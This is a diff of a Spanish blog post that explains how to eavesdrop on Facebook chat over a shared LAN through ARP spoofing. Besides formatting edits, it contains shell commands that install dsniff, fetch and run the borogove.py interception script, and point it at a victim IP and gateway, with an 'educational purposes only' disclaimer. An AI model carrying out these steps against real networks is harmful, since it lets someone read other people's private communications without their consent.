@@ -3,6 +3,7 @@ layout: post
 status: publish
 published: true
 title: Escuchando conversaciones de Facebook
+class: no-line-numbers
 author:
   display_name: vdo
   login: vdo
@@ -39,28 +40,32 @@ Para usarlo, debemos instalar las dependencias dsniff, pypcap y dpkt.
 Lo mas fácil será ilustrar su uso mediante un ejemplo:
 
 <ul>
-<li>En nuestro escenario, **Bob** esta conectado en la misma red local que **Alice**. ** **</li>
-<li>**Alice** se conecta a Internet mediante un **Router** o puerta de enlace.</li>
-<li>El router tiene la IP 192.168.1.1</li>
-<li>Alice tiene la IP 192.168.1.22</li>
-<li>Bob tiene la IP 192.168.23</li>
-<li>Bob se conecta a la red mediante la interfaz wlan0.</li>
+  <li>En nuestro escenario, **Bob** esta conectado en la misma red local que **Alice**. ** **</li>
+  <li>**Alice** se conecta a Internet mediante un **Router** o puerta de enlace.</li>
+  <li>El router tiene la IP 192.168.1.1</li>
+  <li>Alice tiene la IP 192.168.1.22</li>
+  <li>Bob tiene la IP 192.168.23</li>
+  <li>Bob se conecta a la red mediante la interfaz wlan0.</li>
 </ul>
 
-Lo que pretende Bob es "engañar" al Router y al PC de Alice, interfiriendo en su comunicación de forma transparente. He aquí un esquema bastante simplificado del proceso:<a href="http://www.racotecnic.com/wp-content/uploads/2011/01/esquema.jpg"><img class="aligncenter size-medium wp-image-1733" src="http://www.racotecnic.com/wp-content/uploads/2011/01/esquema-222x300.jpg" alt="" width="222" height="300" /></a>
+Lo que pretende Bob es "engañar" al Router y al PC de Alice, interfiriendo en su comunicación de forma transparente. He aquí un esquema bastante simplificado del proceso:<a href="{{ site.url }}/uploads/2011/01/esquema.jpg"><img class="aligncenter size-medium wp-image-1733" src="{{ site.url }}/uploads/2011/01/esquema-222x300.jpg" alt="" width="222" height="300" /></a>
 
 Una vez hecho esto, puede "inspeccionar" los paquetes que Alice envía o recibe en busca de conversaciones, sin que la víctima note nada (excepto, quizá, una conexión algo mas lenta). Dado que el chat de Facebook no funciona en HTTPS, se envía siempre en texto plano, lo qual es sumamente inseguro y permite este tipo de ataques.
 
 Para usarlo en Ubuntu seguid los siguientes pasos:
+
 ~~~bash
 sudo -s
 aptitude install dsniff python-pypcap python-dpkg
 wget http://borogove.googlecode.com/svn/trunk/borogove.py
 chmod +x borogove.py
-./borogove.py &amp;lt;interfaz&amp;gt; &amp;lt;IP_vicima&amp;gt; &amp;lt;gateway&amp;gt;
+./borogove.py <interfaz> <IP_vicima> <gateway>
 ~~~
+
 Por ejemplo, Bob lo usaría así:
+
 ~~~bash
 ./borogove.py wlan0 192.168.1.22 192.168.1.1
 ~~~
+
 Salud y ya sabéis, usar sólo para fines educativos y bajo vuestra responsabilidad.
